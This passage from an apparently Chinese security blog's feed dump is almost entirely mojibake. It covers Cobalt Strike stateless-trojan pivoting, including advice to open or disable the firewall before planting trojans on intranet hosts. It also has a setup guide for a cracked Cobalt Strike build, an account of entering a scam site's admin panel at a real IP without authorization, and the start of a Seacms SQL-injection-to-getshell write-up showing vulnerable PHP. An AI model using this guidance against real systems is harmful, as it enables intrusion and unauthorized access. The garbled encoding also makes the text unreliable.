çŠ¶æ€æœ¨é©¬çš„ä½¿ç”¨æ–¹æ³•ã€‚ä¸€èˆ¬ä½¿ç”¨æ— çŠ¶æ€æœ¨é©¬çš„ç½‘ç»œç¯å¢ƒæ˜¯è¿™æ ·çš„</h4><p><a href="https://imgchr.com/i/euTQFe"><img src="https://s2.ax1x.com/2019/07/27/euTQFe.png" alt="euTQFe.png"></a></p><p>é¦–å…ˆä½ éœ€è¦è®©ä¸€å°ä¸»æœºä½œä¸ºä¸­è½¬å™¨ï¼Œé…åˆæ— çŠ¶æ€æœ¨é©¬ä½¿ç”¨</p><p><a href="https://imgchr.com/i/euTlJH"><img src="https://s2.ax1x.com/2019/07/27/euTlJH.png" alt="euTlJH.png"></a></p><p>è¿™é‡Œé€‰æ‹©ä¸­è½¬å™¨çš„ç›‘å¬å™¨ç”Ÿæˆæœ¨é©¬ã€‚éœ€è¦æ³¨æ„â€“å¦‚æœå¼€å¯äº†é˜²ç«å¢™ä¼šäº§ç”Ÿä¸€ä¸ªWindowså®‰å…¨è­¦æŠ¥ã€‚å› æ­¤æœ€å¥½æå‰ç”¨cmdæ·»åŠ ä¸€ä¸ªé˜²ç«å¢™æ”¾è¡Œè§„åˆ™æˆ–å…³é—­é˜²ç«å¢™ï¼Œéšåä¾¿å¯å°†æ— çŠ¶æ€çš„æœ¨é©¬ä¸Šä¼ åˆ°å†…ç½‘çš„å…¶ä»–æœºå™¨è¿è¡Œåè¿”å›ä¸€ä¸ªä¼šè¯</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(ä¸€)ç®€ä»‹ä¸å®‰è£…</title>
      <link href="/2019/06/07/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%80-%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"/>
      <url>/2019/06/07/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%80-%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrikeç®€ä»‹"><a href="#0x01-Cobaltstrikeç®€ä»‹" class="headerlink" title="0x01-Cobaltstrikeç®€ä»‹"></a>0x01-Cobaltstrikeç®€ä»‹</h2><p>Cobalt Strikeæ˜¯ä¸€æ¬¾ç¾å›½Red Teamå¼€å‘çš„æ¸—é€æµ‹è¯•ç¥å™¨ï¼Œå¸¸è¢«ä¸šç•Œäººç§°ä¸ºCSã€‚è¿™æ¬¾ç¥å™¨è®¸å¤šå¤§ä½¬ä»¬éƒ½å·²ç»ç©çš„å¾ˆ6ï¼Œæˆ‘ä¸€ä¸ªèœé¸¡ç©çš„ç•¥æœ‰å¿ƒå¾—ï¼Œå› æ­¤å†™ä¸€ä¸‹è‡ªå·±çš„Cobaltstrikeç³»åˆ—æ–‡ç« ï¼Œå¸Œæœ›ç»™å„ä½ä¸€ç‚¹å¸®åŠ©ã€‚<br>æœ€è¿‘è¿™ä¸ªå·¥å…·å¤§ç«ï¼Œæˆä¸ºäº†æ¸—é€æµ‹è¯•ä¸­ä¸å¯ç¼ºå°‘çš„åˆ©å™¨ã€‚å…¶æ‹¥æœ‰å¤šç§åè®®ä¸»æœºä¸Šçº¿æ–¹å¼ï¼Œé›†æˆäº†ææƒï¼Œå‡­æ®å¯¼å‡ºï¼Œç«¯å£è½¬å‘ï¼Œsocketä»£ç†ï¼Œofficeæ”»å‡»ï¼Œæ–‡ä»¶æ†ç»‘ï¼Œé’“é±¼ç­‰åŠŸèƒ½ã€‚åŒæ—¶ï¼ŒCobalt Strikeè¿˜å¯ä»¥è°ƒç”¨Mimikatzç­‰å…¶ä»–çŸ¥åå·¥å…·ï¼Œå› æ­¤å¹¿å—é»‘å®¢å–œçˆ±ã€‚<br>é¡¹ç›®å®˜ç½‘:<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a><br><a href="https://imgchr.com/i/eV6shQ"><img src="https://s2.ax1x.com/2019/07/24/eV6shQ.png" alt="eV6shQ.png"></a><br>è¯è¯´è¿™ä¸ªå·¥å…·çš„ç¤¾åŒºç‰ˆæ˜¯å¤§å®¶ç†ŸçŸ¥çš„Armitage(ä¸€ä¸ªMSFçš„å›¾å½¢åŒ–ç•Œé¢å·¥å…·)ï¼Œè€ŒCobaltstrikeå¤§å®¶å¯ä»¥ç†è§£å…¶ä¸ºArmitageçš„å•†ä¸šç‰ˆã€‚<br><img src="https://s2.ax1x.com/2019/07/24/eVcS4e.png" alt="eVcS4e.png"><br>æ—©æœŸç‰ˆæœ¬CobaltSrtikeä¾èµ–Metasploitæ¡†æ¶ï¼Œè€Œç°åœ¨Cobalt Strikeå·²ç»ä¸å†ä½¿ç”¨MSFè€Œæ˜¯ä½œä¸ºå•ç‹¬çš„å¹³å°ä½¿ç”¨ï¼Œå®ƒåˆ†ä¸ºå®¢æˆ·ç«¯(Client)ä¸æœåŠ¡ç«¯(Teamserver)ï¼ŒæœåŠ¡ç«¯æ˜¯ä¸€ä¸ªï¼Œå®¢æˆ·ç«¯å¯ä»¥æœ‰å¤šä¸ªï¼Œå›¢é˜Ÿå¯è¿›è¡Œåˆ†å¸ƒå¼åå›¢æ“ä½œã€‚<br><a href="https://imgchr.com/i/eVcPgA"><img src="https://s2.ax1x.com/2019/07/24/eVcPgA.png" alt="eVcPgA.png"></a></p><h2 id="0x02-Cobaltstrikeæ¶æ„"><a href="#0x02-Cobaltstrikeæ¶æ„" class="headerlink" title="0x02-Cobaltstrikeæ¶æ„"></a>0x02-Cobaltstrikeæ¶æ„</h2><p>æœ¬äººä½¿ç”¨çš„æ˜¯Cabaltstrike3.13ç‰ˆæœ¬ï¼Œè™½ç„¶å®˜æ–¹å·²ç»æ›´æ–°åˆ°3.14ç‰ˆæœ¬ï¼Œä½†æ˜¯æˆ‘å‘ç°3.14ç‰ˆæœ¬å¹¶ä¸ç¨³å®šï¼Œå› æ­¤ä¸æ¨èä½¿ç”¨<br>3.13ç‰ˆæœ¬æ–‡ä»¶æ¶æ„å¦‚ä¸‹ã€‚</p><p>â”‚  Scripts ç”¨æˆ·å®‰è£…çš„æ’ä»¶<br>â”‚  Log æ¯å¤©çš„æ—¥å¿—<br>â”‚  c2lint  æ£€æŸ¥profileçš„é”™è¯¯å¼‚å¸¸<br>â”‚  cobaltstrike<br>â”‚  cobaltstrike.jar å®¢æˆ·ç«¯ç¨‹åº<br>â”‚  icon.jpg      LOGO<br>â”‚  license.pdf  è®¸å¯è¯æ–‡ä»¶<br>â”‚  readme.txt<br>â”‚  releasenotes.txt<br>â”‚  teamserver  æœåŠ¡ç«¯ç¨‹åº<br>â”‚  update<br>â”‚  update.jar   æ›´æ–°ç¨‹åº<br>â””â”€third-party ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œé‡Œé¢æ”¾çš„vnc dll</p><p>å½“ç„¶ï¼Œå¼ºå¤§çš„CSä¹Ÿæ”¯æŒç”¨æˆ·æ¥æ‰©å±•å…¶åŠŸèƒ½<br>â€»ç§äººå®šåˆ¶</p><p>â‘ Cobalt Strikeå¯ä»¥ä½¿ç”¨ AggressorScriptsè„šæœ¬æ¥åŠ å¼ºè‡ªèº«ï¼Œä½¿å…¶æ›´åŠ ä¸°æ»¡ï¼Œèƒ½å¤Ÿæ‰©å±•èœå•æ ï¼Œè§†å›¾Beaconå‘½ä»¤è¡Œï¼Œææƒè„šæœ¬ç­‰</p><p>â‘¡Cobalt Strikeé€šä¿¡é…ç½®æ–‡ä»¶æ˜¯ Malleable C2 ä½ å¯ä»¥ä¿®æ”¹ CSçš„é€šè®¯ç‰¹å¾ï¼ŒBeacon payloadçš„ä¸€äº›è¡Œä¸º</p><p>â‘¢Cobalt Strikeå¯ä»¥å¼•ç”¨å…¶ä»–çš„é€šè®¯æ¡†æ¶ExternalC2ï¼ŒExternalC2æ˜¯ç”±Cobalt Strikeæå‡ºçš„ä¸€å¥—è§„èŒƒ&#x2F;æ¡†æ¶ï¼Œå®ƒå…è®¸é»‘å®¢æ ¹æ®éœ€è¦å¯¹æ¡†æ¶æä¾›çš„é»˜è®¤HTTP(S)&#x2F;DNS&#x2F;SMB C2 é€šä¿¡é€šé“è¿›è¡Œæ‰©å±•ã€‚</p><p>æ€»çš„æ¥è¯´ CSçš„è‡ªå®šä¹‰åŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œä½¿ç”¨èµ·æ¥å¾ˆçµæ´»åæœŸï¼Œä¼šè®²åˆ°ç›¸å…³çš„ä½¿ç”¨ã€‚</p><h2 id="0x03-Cobaltstrike-teamserverçš„å¯åŠ¨"><a href="#0x03-Cobaltstrike-teamserverçš„å¯åŠ¨" class="headerlink" title="0x03-Cobaltstrike teamserverçš„å¯åŠ¨"></a>0x03-Cobaltstrike teamserverçš„å¯åŠ¨</h2><p>æœ¬äººä½¿ç”¨çš„Cobaltstrikeæ˜¯3.13æ±‰åŒ–ç ´è§£ç‰ˆæœ¬ï¼Œå„ä½å¦‚æœæœ‰èƒ½åŠ›ï¼Œå¯ä»¥æ”¯æŒä¸€ä¸‹æ­£ç‰ˆå“ˆ,ä»·æ ¼æˆ‘æ˜¯æ¥å—ä¸å¤ªäº†çš„~æ­¤å¤–ï¼Œå„ä½å¸ˆå‚…ä¹Ÿè¦ä¹°å¥½VPS<br><img src="https://s2.ax1x.com/2019/07/24/eVcwvR.png" alt="eVcwvR.png"><br>å¼€å¯Cobaltstrike teamserverå’Œè¿è¡ŒGUIç•Œé¢å‡éœ€è¦Javaç¯å¢ƒï¼Œå› æ­¤è€å“¥ä»¬å¿…é¡»å…ˆæŠŠç”µè„‘ä¸Šçš„Javaè£…å¥½ï¼Œè¿™ä¸ªç™¾åº¦ä¸Šéƒ½å†™çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘åœ¨æ­¤å°±ä¸èµ˜è¿°äº†ã€‚</p><h3 id="1-Windowsä¸‹å¯åŠ¨teamserver"><a href="#1-Windowsä¸‹å¯åŠ¨teamserver" class="headerlink" title="1.Windowsä¸‹å¯åŠ¨teamserver"></a>1.Windowsä¸‹å¯åŠ¨teamserver</h3><p>â‘ ä¸‹è½½keytool.exeå¹¶å°†å…¶å¤åˆ¶åˆ°Cobaltstrikeæ–‡ä»¶å¤¹ä¸‹<br>ä¸‹è½½é“¾æ¥:<a href="http://www.onlinedown.net/soft/614989.htm">http://www.onlinedown.net/soft/614989.htm</a></p><p>â‘¡åˆ‡æ¢åˆ°Cobaltstrikeç›®å½•æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><pre><code>Keytool.exe -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;</code></pre><p><a href="https://imgchr.com/i/eV6DAS"><img src="https://s2.ax1x.com/2019/07/24/eV6DAS.png" alt="eV6DAS.png"></a></p><p>â‘¢æ‰§è¡Œå‘½ä»¤</p><p>  teamserver.bat 8.8.8.8 123456 </p><p>8.8.8.8ä¸ºä½ çš„æœåŠ¡å™¨å¤–ç½‘IP,123456ä¸ºCoabltstrikeçš„å®¢æˆ·ç«¯å¯†ç </p><p>â‘£åŒå‡»cobaltstrike.batï¼Œå¡«å†™æœåŠ¡å™¨å¤–ç½‘IPå’Œteamserverå¯†ç ï¼Œå³å¯ç™»å…¥</p><h3 id="2-Linuxä¸‹å¯åŠ¨teamserverå’Œå®¢æˆ·ç«¯"><a href="#2-Linuxä¸‹å¯åŠ¨teamserverå’Œå®¢æˆ·ç«¯" class="headerlink" title="2.Linuxä¸‹å¯åŠ¨teamserverå’Œå®¢æˆ·ç«¯"></a>2.Linuxä¸‹å¯åŠ¨teamserverå’Œå®¢æˆ·ç«¯</h3><p>â‘ cdåˆ‡æ¢åˆ°Cobaltstrikeç›®å½•ä¸‹<br>â‘¡æ‰§è¡Œå‘½ä»¤<br>teamserver.bat 8.8.8.8 123456<br>8.8.8.8ä¸ºä½ çš„æœåŠ¡å™¨å¤–ç½‘IP,123456ä¸ºCoabltstrikeçš„å®¢æˆ·ç«¯å¯†ç <br><a href="https://s2.ax1x.com/2019/07/24/eV6c1s.png">https://s2.ax1x.com/2019/07/24/eV6c1s.png</a><br>â‘¢æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯çœ‹åˆ°GUIç•Œé¢</p><pre><code>Javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></pre><h2 id="0x04-Cobaltstrikeæ±‰åŒ–ç ´è§£ç‰ˆä¸‹è½½"><a href="#0x04-Cobaltstrikeæ±‰åŒ–ç ´è§£ç‰ˆä¸‹è½½" class="headerlink" title="0x04-Cobaltstrikeæ±‰åŒ–ç ´è§£ç‰ˆä¸‹è½½"></a>0x04-Cobaltstrikeæ±‰åŒ–ç ´è§£ç‰ˆä¸‹è½½</h2><p>ç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œæœ¬BLOGæš‚ä¸æä¾›ä¸ªäººç‰ˆæœ¬</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡20æ’¸240çš„æ²™é›•å¨èƒæƒ…æŠ¥æäº¤</title>
      <link href="/2019/03/17/%E8%AE%B0%E4%B8%80%E6%AC%A120%E6%92%B8240%E7%9A%84%E6%B2%99%E9%9B%95%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8F%90%E4%BA%A4/"/>
      <url>/2019/03/17/%E8%AE%B0%E4%B8%80%E6%AC%A120%E6%92%B8240%E7%9A%84%E6%B2%99%E9%9B%95%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8F%90%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-èµ·å› "><a href="#0x01-èµ·å› " class="headerlink" title="0x01 èµ·å› "></a>0x01 èµ·å› </h2><p>è¿™æ˜¯ä¸€ç¯‡æ²¡æœ‰ä»»ä½•æŠ€æœ¯æ€§çš„æ–‡ç« ï¼Œå•çº¯è®°å½•ä¸€ä¸‹æ„æƒ³ä¸åˆ°çš„èµšå°é’±ç»å†</p><p>å‰å‡ ä¸ªæœˆï¼Œæˆ‘çš„å¼Ÿå¼Ÿçªç„¶QQç»™æˆ‘å‘æ¥äº†ä¸€æ¡æ¶ˆæ¯ï¼Œè¯´è¦ä¹°ä¸ªQQé£è½¦çš„cdkï¼Œæˆ‘ä½œä¸ºä¸€ä¸ªé€šæƒ…è¾¾ç†çš„å¥½å“¥å“¥ï¼Œè‡ªç„¶ä¸å¥½æ„æ€å›ç»ï¼Œç›´æ¥å«ä»–å‘æ¥äº†æ·˜å®é“¾æ¥<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442441.png" alt="image-20230419144208406" style="zoom:33%;" /><br>23å—é’±å¿…ä¸­Aè½¦ï¼Œæœˆé”€é‡1000å¤šã€‚ã€‚çœ‹èµ·æ¥è¿˜è¡Œï¼Œæœ¬æ¥ä¹Ÿæ²¡å¤šå°‘é’±ï¼Œæ²¡ä»”ç»†æƒ³ï¼Œç›´æ¥ä¹°äº†ä¸‹æ¥<br>å•†å®¶å‘è´§çš„æ—¶å€™ç§èŠç»™äº†æˆ‘è¿™ä¸ªã€‚ã€‚ã€‚<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442539.png" alt="image-20230419144235519" style="zoom:33%;" /><br>ä»–ä»¬ç»™å‡ºçš„å…‘æ¢CDKé“¾æ¥ä¸º</p><p><a href="http://39.104.158.110/game.html">http://39.104.158.110/game.html</a></p><p>ä½ è¿™æ˜¯qqé£è½¦çš„å®˜ç½‘ï¼Ÿï¼Ÿï¼Ÿå¦‚æ­¤ç²—åˆ¶æ»¥é€ çš„cdkå…‘æ¢ç•Œé¢<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191442589.png" alt="image-20230419144255565"></p><p>å¾ˆæ˜æ˜¾æ˜¯åœ¨éª—äººï¼Œä¸€æ€’ä¹‹ä¸‹æ‰¾å•†å®¶é€€æ¬¾</p><p>å¹¶ä¸”è·Ÿéª—å­å®¢æœè¿›è¡Œäº†é•¿æ—¶é—´äº¤æµï¼Œè°çŸ¥ç«Ÿç„¶é©³å›äº†æˆ‘çš„é€€æ¬¾è¦æ±‚</p><p>ä¿¡æ¯å®‰å…¨ä»ä¸šè€…çš„å°Šä¸¥ä¸€ä¸‹è§‰é†’äº†ã€‚</p><h2 id="0x02-è¿›å…¥å‘å¡åå°"><a href="#0x02-è¿›å…¥å‘å¡åå°" class="headerlink" title="0x02 è¿›å…¥å‘å¡åå°"></a>0x02 è¿›å…¥å‘å¡åå°</h2><p>è®¿é—®<a href="http://39.104.158.110è¿™ä¸ªä¸»ç•Œé¢/">http://39.104.158.110è¿™ä¸ªä¸»ç•Œé¢</a><br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444080.png" alt="image-20230419144401051"><br>çœ‹ä¸‹å‰å°JSä»£ç <br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444875.png" alt="image-20230419144410855"><br>æ®æ­¤æ¨æµ‹ï¼Œææœ‰å¯èƒ½å­˜åœ¨æœªæˆæƒè®¿é—®ã€‚</p><p>ç›´æ¥è®¿é—®ç½‘å€:<a href="http://39.104.158.110/user/onindex%EF%BC%8C">http://39.104.158.110/user/onindexï¼Œ</a><br>æˆåŠŸè¿›å…¥åå°<br>è®©æˆ‘ä»¬çœ‹çœ‹åå°æ˜¯ä»€ä¹ˆæ ·å­çš„<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444291.png" alt="image-20230419144425269"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191444658.png" alt="image-20230419144443629">çœŸçš„å¾ˆå‰å®³å“¦ï¼Œè¿˜å¯ä»¥ç”Ÿæˆå®˜æ–¹çš„cdkï¼Ÿï¼Ÿï¼Ÿ<br>è¿˜å¯ä»¥é…ç½®è¾“å…¥cdkåçš„è¿”å›æ¨¡æ¿ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>è¯ˆéª—æ€§è´¨ä¸è¨€è€Œå–»ï¼Œè€Œæ·˜å®è¯„ä»·ä¸­å…¨æ˜¯å¥½è¯„ï¼Œæˆ‘ä¹Ÿç€å®è´¹è§£äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191445240.png" alt="image-20230419144504218"></p><h2 id="0x03-äº‹å"><a href="#0x03-äº‹å" class="headerlink" title="0x03 äº‹å"></a>0x03 äº‹å</h2><p>éšåæˆ‘æŠŠä»–ä»¬åå°çš„æˆªå›¾å‘ç»™äº†éª—å­å®¢æœï¼Œå®¢æœä¹Ÿæ²¡å›å¤æˆ‘ï¼Œå’±ä¹Ÿä¸çŸ¥é“æ˜¯æ€‚äº†è¿˜æ˜¯æ€ä¹ˆäº†</p><p>ä¸€æ€’ä¹‹ä¸‹ï¼Œå†³å®šæäº¤ç»™ASRC</p><p>å½“æ—¶å¹¶æ²¡æƒ³åˆ°è¿™ç§æ²™é›•å¨èƒæƒ…æŠ¥èƒ½æ‹¿åˆ°å¥–é‡‘ï¼Œåªæ˜¯æƒ³æƒ©æˆ’ä¸€ä¸‹è¿™ç§**éª—å­è€Œå·²ã€‚</p><p>æ²¡æƒ³åˆ°ASRCç¡®è®¤äº†æƒ…æŠ¥ï¼Œä¸‹æ¶äº†è¯¥åº—é“º<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191446634.png" alt="image-20230419144601604"><br>æˆ‘é ï¼Œè¿˜æœ‰24ä¸ªå®‰å…¨å¸<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191446127.png" alt="image-20230419144613099"><br>è‡³æ­¤ï¼Œ20æ’¸240åœ†æ»¡æˆåŠŸã€‚</p><p>æ€»æœ‰äº›æ„æƒ³ä¸åˆ°çš„é™…é‡ï¼Œå®åœ¨æ²¡æƒ³åˆ°è¿™ä¹Ÿèƒ½ç»™é’±</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seacmsæœ€æ–°ç‰ˆæœ¬æ³¨å…¥å®æˆ˜+åå°RCEæˆåŠŸgetshell</title>
      <link href="/2019/02/11/Seacms%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98-%E5%90%8E%E5%8F%B0RCE%E6%88%90%E5%8A%9Fgetshell/"/>
      <url>/2019/02/11/Seacms%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98-%E5%90%8E%E5%8F%B0RCE%E6%88%90%E5%8A%9Fgetshell/</url>
      
        <content type="html"><![CDATA[<h2 id="0X01æµ·æ´‹CMSç®€ä»‹"><a href="#0X01æµ·æ´‹CMSç®€ä»‹" class="headerlink" title="0X01æµ·æ´‹CMSç®€ä»‹#"></a>0X01æµ·æ´‹CMSç®€ä»‹<a href="https://www.secquan.org/Discuss/1068831#0X001%E6%B5%B7%E6%B4%8BCMS%E7%AE%80%E4%BB%8B">#</a></h2><p>æµ·æ´‹cmsæ˜¯ä¸ºè§£å†³ç«™é•¿æ ¸å¿ƒéœ€æ±‚è€Œè®¾è®¡çš„è§†é¢‘å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œä¸€å¥—ç¨‹åºè‡ªé€‚åº”ç”µè„‘ã€æ‰‹æœºã€å¹³æ¿ã€APPå¤šä¸ªç»ˆç«¯å…¥å£ï¼Œæ— ä»»ä½•åŠ å¯†ä»£ç ã€å®‰å…¨æœ‰ä¿éšœï¼Œæ˜¯æ‚¨æœ€ä½³çš„å»ºç«™å·¥å…·ã€‚â€”â€”æ¥è‡ªseacmså®˜ç½‘ï¼ˆç®€è€Œè¨€ä¹‹å°±æ˜¯ä¸“é—¨æ­å»ºçœ‹ç‰‡ç½‘ç«™çš„cmsï¼‰<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191935056.png" alt="image-20230419193549025"></p><h2 id="0X02æµ·æ´‹CMS-V9-1ä»¥ä¸‹ç‰ˆæœ¬å…¨ç‰ˆæœ¬SQLæ³¨å…¥åˆ†æ"><a href="#0X02æµ·æ´‹CMS-V9-1ä»¥ä¸‹ç‰ˆæœ¬å…¨ç‰ˆæœ¬SQLæ³¨å…¥åˆ†æ" class="headerlink" title="0X02æµ·æ´‹CMS V9.1ä»¥ä¸‹ç‰ˆæœ¬å…¨ç‰ˆæœ¬SQLæ³¨å…¥åˆ†æ#"></a>0X02æµ·æ´‹CMS V9.1ä»¥ä¸‹ç‰ˆæœ¬å…¨ç‰ˆæœ¬SQLæ³¨å…¥åˆ†æ<a href="https://www.secquan.org/Discuss/1068831#0X002%E6%B5%B7%E6%B4%8BCMS-V9.1%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%E5%85%A8%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90">#</a></h2><p>çœ‹åˆ°äº†æœ€è¿‘toolsä¸Šæœ€æ–°çš„seacms sqlæ³¨å…¥æ¼æ´ï¼Œä¸ç”±å¾—ä¸‹ä½“ä¸€ç¡¬ã€‚<br>å¹²å¹²å·´å·´çš„ï¼Œcnmï¼Œå¿…é¡»ç›˜ä»–ï¼</p><p>æ¼æ´äº§ç”Ÿå¤„codeå¦‚ä¸‹</p><pre><code class="php">session_start();require_once(&quot;../../include/common.php&quot;);$id = (isset($gid) &amp;&amp; is_numeric($gid)) ? $gid : 0;$page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1;$type = (isset($type) &amp;&amp; is_numeric($type)) ? $type : 1;$pCount = 0;$jsoncachefile = sea_DATA.&quot;/cache/review/$type/$id.js&quot;;//ç¼“å­˜ç¬¬ä¸€é¡µçš„è¯„è®ºif($page&lt;2)&#123;        if(file_exists($jsoncachefile))        &#123;                $json=LoadFile($jsoncachefile);                die($json);        &#125;&#125;$h = ReadData($id,$page);$rlist = array();if($page&lt;2)&#123;        createTextFile($h,$jsoncachefile);&#125;die($h);        function ReadData($id,$page)&#123;        global $type,$pCount,$rlist;        $ret = array(&quot;&quot;,&quot;&quot;,$page,0,10,$type,$id);        if($id&gt;0)        &#123;                $ret[0] = Readmlist($id,$page,$ret[4]);                $ret[3] = $pCount;                $x = implode(&#39;,&#39;,$rlist);                if(!empty($x))                &#123;                $ret[1] = Readrlist($x,1,10000);                &#125;        &#125;        $readData = FormatJson($ret);        return $readData;&#125;function Readmlist($id,$page,$size)&#123;        global $dsql,$type,$pCount,$rlist;        $ml=array();        if($id&gt;0)        &#123;                $sqlCount = &quot;SELECT count(*) as dd FROM sea_comment WHERE m_type=$type AND v_id=$id ORDER BY id DESC&quot;;                $rs = $dsql -&gt;GetOne($sqlCount);                $pCount = ceil($rs[&#39;dd&#39;]/$size);                $sql = &quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND v_id=$id ORDER BY id DESC limit &quot;.($page-1)*$size.&quot;,$size &quot;;                $dsql-&gt;setQuery($sql);                $dsql-&gt;Execute(&#39;commentmlist&#39;);                while($row=$dsql-&gt;GetArray(&#39;commentmlist&#39;))                &#123;                        $row[&#39;reply&#39;].=ReadReplyID($id,$row[&#39;reply&#39;],$rlist);                        $ml[]=&quot;&#123;\&quot;cmid\&quot;:&quot;.$row[&#39;id&#39;].&quot;,\&quot;uid\&quot;:&quot;.$row[&#39;uid&#39;].&quot;,\&quot;tmp\&quot;:\&quot;\&quot;,\&quot;nick\&quot;:\&quot;&quot;.$row[&#39;username&#39;].&quot;\&quot;,\&quot;face\&quot;:\&quot;\&quot;,\&quot;star\&quot;:\&quot;\&quot;,\&quot;anony\&quot;:&quot;.(empty($row[&#39;username&#39;])?1:0).&quot;,\&quot;from\&quot;:\&quot;&quot;.$row[&#39;username&#39;].&quot;\&quot;,\&quot;time\&quot;:\&quot;&quot;.date(&quot;Y/n/j H:i:s&quot;,$row[&#39;dtime&#39;]).&quot;\&quot;,\&quot;reply\&quot;:\&quot;&quot;.$row[&#39;reply&#39;].&quot;\&quot;,\&quot;content\&quot;:\&quot;&quot;.$row[&#39;msg&#39;].&quot;\&quot;,\&quot;agree\&quot;:&quot;.$row[&#39;agree&#39;].&quot;,\&quot;aginst\&quot;:&quot;.$row[&#39;anti&#39;].&quot;,\&quot;pic\&quot;:\&quot;&quot;.$row[&#39;pic&#39;].&quot;\&quot;,\&quot;vote\&quot;:\&quot;&quot;.$row[&#39;vote&#39;].&quot;\&quot;,\&quot;allow\&quot;:\&quot;&quot;.(empty($row[&#39;anti&#39;])?0:1).&quot;\&quot;,\&quot;check\&quot;:\&quot;&quot;.$row[&#39;ischeck&#39;].&quot;\&quot;&#125;&quot;;                &#125;        &#125;        $readmlist=join($ml,&quot;,&quot;);        return $readmlist;&#125;function Readrlist($ids,$page,$size)&#123;        global $dsql,$type;        $rl=array();        $sql = &quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC&quot;;        $dsql-&gt;setQuery($sql);        $dsql-&gt;Execute(&#39;commentrlist&#39;);        while($row=$dsql-&gt;GetArray(&#39;commentrlist&#39;))        &#123;                $rl[]=&quot;\&quot;&quot;.$row[&#39;id&#39;].&quot;\&quot;:&#123;\&quot;uid\&quot;:&quot;.$row[&#39;uid&#39;].&quot;,\&quot;tmp\&quot;:\&quot;\&quot;,\&quot;nick\&quot;:\&quot;&quot;.$row[&#39;username&#39;].&quot;\&quot;,\&quot;face\&quot;:\&quot;\&quot;,\&quot;star\&quot;:\&quot;\&quot;,\&quot;anony\&quot;:&quot;.(empty($row[&#39;username&#39;])?1:0).&quot;,\&quot;from\&quot;:\&quot;&quot;.$row[&#39;username&#39;].&quot;\&quot;,\&quot;time\&quot;:\&quot;&quot;.$row[&#39;dtime&#39;].&quot;\&quot;,\&quot;reply\&quot;:\&quot;&quot;.$row[&#39;reply&#39;].&quot;\&quot;,\&quot;content\&quot;:\&quot;&quot;.$row[&#39;msg&#39;].&quot;\&quot;,\&quot;agree\&quot;:&quot;.$row[&#39;agree&#39;].&quot;,\&quot;aginst\&quot;:&quot;.$row[&#39;anti&#39;].&quot;,\&quot;pic\&quot;:\&quot;&quot;.$row[&#39;pic&#39;].&quot;\&quot;,\&quot;vote\&quot;:\&quot;&quot;.$row[&#39;vote&#39;].&quot;\&quot;,\&quot;allow\&quot;:\&quot;&quot;.(empty($row[&#39;anti&#39;])?0:1).&quot;\&quot;,\&quot;check\&quot;:\&quot;&quot;.$row[&#39;ischeck&#39;].&quot;\&quot;&#125;&quot;;        &#125;        $readrlist=join($rl,&quot;,&quot;);        return 